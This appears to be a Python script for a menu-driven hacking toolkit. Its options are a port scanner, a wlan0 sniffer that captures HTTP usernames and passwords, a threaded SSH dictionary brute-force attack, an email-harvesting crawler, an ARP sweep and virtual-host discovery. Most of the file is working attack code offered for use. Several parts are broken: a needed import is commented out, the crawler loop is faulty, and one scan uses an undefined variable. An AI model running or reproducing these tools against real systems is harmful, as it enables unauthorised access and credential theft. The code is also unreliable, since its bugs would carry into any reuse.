import socket
import subprocess
import sys
import os
from datetime import datetime
import struct
import textwrap
import scapy.all as scapy
import argparse
import prettytable
from prettytable import PrettyTable
from scapy.layers import http
import threading
from threading import Thread
import time
from bs4 import BeautifulSoup
import requests
import requests.exceptions
import urllib3
from urllib.parse import urlsplit
from collections import deque
import re
import argparse
#from pexpect import pxssh
import nmap




os.system("clear")
print("Tool started")
print('\n')

print(" 1. Port Scanning ")
print(" 2. Network Sniffer ")
print(" 3. Password cracking ")
print(" 4. Email/Phone/Banner")
print(" 5. Vunerability Scanner")
print(" 6. Running Service ")


op = input("Choose your desired Option : ")

#First case

if op == "1" :
    
    remoteServer    = input("Enter a remote host to scan: ")
    remoteServerIP  = socket.gethostbyname(remoteServer)
    t1 = datetime.now()
     
    try:
        x= PrettyTable(["Active Ports"])
        for port in range(21,500):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                 x.add_row([port])
        print (x.get_string()) 

    except socket.error:
        print ("Couldn't connect to server")
        sys.exit()
        
    t2 = datetime.now()
    total =  t2 - t1
    print ('Scanning Completed in: ', total)
    
#second case
# reference with subscription for packpub  "https://subscription.packtpub.com/book/networking_and_servers/9781784399771/7/ch07lvl1sec43/pyshark"

elif op == "2":

          
    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keys = ["username", "password", "pass", "email"]   
                for key in keys:
                    if key in load:
                        print("[+] Possible password/username: " +load)
                        break
    

    scapy.sniff(iface="wlan0", prn=process_packet)

#Third case

    #Partial Reference "https://github.com/j2sg/johnny"
    
elif op == "3" :
    Found = False
    Fails = 0

    maxConnections = 5
    connection_lock = threading.BoundedSemaphore(maxConnections)

    def nmapScan(tgtHost):
            nmapScan = nmap.PortScanner()
            nmapScan.scan(tgtHost, '22')
            state = nmapScan[tgtHost]['tcp'][22]['state']
            return state

    def connect(host, user, password, release):
            global Found
            global Fails
            try:
                    s = pxssh.pxssh()
                    s.login(host, user, password)
                    print('\n[+] Password Found: {}\n'.format(password.decode('utf-8')))
                    Found = True
                    s.logout()
            except Exception as e:
                    if 'read_nonblocking' in str(e):
                            Fails += 1
                            time.sleep(5)
                            connect(host, user, password, False)
                    elif 'synchronize with original prompt' in str(e):
                            time.sleep(1)
                            connect(host, user, password, False)
            finally:
                    if release: 
                            connection_lock.release()

    def main():

            host =input("Please enter host: ")
            user= input("Please enter User: ")
            passwordFile=input("Please enter thw password file location: ")
            global Found
            global Fails
            print('Welcome to SSH Dictionary Based Attack')
            print('[+] Checking SSH port state on {}'.format(host))
            if nmapScan(host) == 'open':
                    print('[+] SSH port 22 open on {}'.format(host))
            else:
                    print('[!] SSH port 22 closed on {}'.format(host))	
                    print('[+] Exiting Application.\n')
                    exit()

            print('[+] Loading Password File\n')
            
            try:
                    fn = open(passwordFile, 'rb')
            except Exception as e:
                    print(e)
                    exit(1)
            
            for line in fn:
                    if Found:
                            # print('[*] Exiting Password Found')
                            exit(0)
                    elif Fails > 5:
                            print('[!] Exiting: Too Many Socket Timeouts')
                            exit(0)

                    connection_lock.acquire()
                    
                    password = line.strip()
                    print('[-] Testing Password With: {}'.format(password.decode('utf-8')))
                    
                    t = Thread(target=connect, args=(host, user, password, True))
                    t.start()
            
            while (threading.active_count() > 1):
                    if threading.active_count() == 1 and Found != True:
                            print('\nPassword Not Found In Password File.\n')
                            print('[*] Exiting Application')
                            exit(0)
                    elif threading.active_count() == 1 and Found == True:
                            print('[*] Exiting Application.\n')

    if __name__ == '__main__':
            main()

#Fourth case

        #reference from https://www.pyimagesearch.com/2015/10/12/scraping-images-with-python-and-scrapy/
elif op == "4" :
    new_urls = deque(['https://www.google.ca'])
    processed_urls = set()
    emails = set()
    while len(new_urls):
        url=new_urls
        processed_urls.add(url)
        z=PrettyTable()
        z.field_names = ["URLs", "email"]
        parts = urlsplit(url)
        base_url = "{0.scheme}://{0.netloc}".format(parts)
        path = url[:url.rfind('/')+1] if '/' in parts.path else url

        print("Processing %s" % url)
        try:
            response = requests.get(url)
        except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
            continue

        new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
        emails.update(new_emails)

        soup = BeautifulSoup(response.text, 'html.parser')
        
        for anchor in soup.find_all("a"):
            link = anchor.attrs["href"] if "href" in anchor.attrs else ''
            if link.startswith('/'):
                link = base_url + link
            elif not link.startswith('http'):
                link = path + link
            if not link in new_urls and not link in processed_urls:
                z.add_row(link)
        z.print()

#Fifth case

       #reference https://gist.github.com/kf4bzt/ff0b499821c12722341dbdbde3f57e60
elif op == "5" :

        x=PrettyTable(['Possible Vulnerabilites'])
        target_ip =input("Please enter target ip: ")
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        client_list = []

        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            client_list.append(client_dict) 
        x.add_row(client_list)
        print(x)
 

#Sixth case
elif op == "6" :
   #reference 'https://github.com/teknogeek/virtual-host-discovery-py/blob/master/scan.py' 
    def main():
        parser = argparse.ArgumentParser()
        parser.add_argument('--ip', dest='ip', type=str,  required=True)
        parser.add_argument('--host', dest='host', type=str, required=True)
        parser.add_argument('--port', dest='port', type=int, default=80)
        parser.add_argument('--ignore-http-codes', dest='ignore_http_codes', type=str, help='comma separated list of http codes', default='404')
        parser.add_argument('--ignore-content-length', dest='ignore_content_length', type=int, default=0)
        parser.add_argument('--wordlist', dest='wordlist', type=str, help='file location', default='wordlist')
        parser.add_argument('--output', dest='output', type=str, help='output file', default='./output.txt')
        parser.add_argument('--ssl', dest='ssl', action='store_true', help='use SSL')

        args = parser.parse_args()
        
        
        ignore_http_codes = list(map(int, args.ignore_http_codes.replace(' ', '').split(',')))
        if os.path.exists(args.wordlist):
            virtual_host_list = open(args.wordlist).read().splitlines()
            results = ''
            
            for virtual_host in virtual_host_list:
                hostname = virtual_host.replace('%s', args.host)

                headers = {
                    'Host': hostname if args.port == 80 else '{}:{}'.format(args.host, args.port),
                    'Accept': '*/*'
                }

                dest_url = '{}://{}:{}/'.format('https' if args.ssl else 'http', args.ip, args.port)
                try:
                    res = requests.get(dest_url, headers=headers, verify=False)
                except requests.exceptions.RequestException:
                    continue

                if res.status_code in ignore_http_codes:
                    continue

                if args.ignore_content_length > 0 and args.ignore_content_length == int(res.headers['content-length']):
                    continue

                x=PrettyTable(['hostname with status code'])
                # do it this way to see results in real-time
                output = 'Found: {} ({})'.format(hostname, res.status_code)
                results += output + '\n'
                x.add_row(output)
                print(x)
                
                for key, val in res.headers.items():
                    output = '  {}: {}'.format(key, val)
                    results += output + '\n'
                    print(output)

        

                print(' Finish writing final results')
        else:
            print('Error: wordlist file "{}" does not exist'.format(args.wordlist))


    if __name__ == '__main__':
        main()


else :
   print(" Enter a valid option... ")
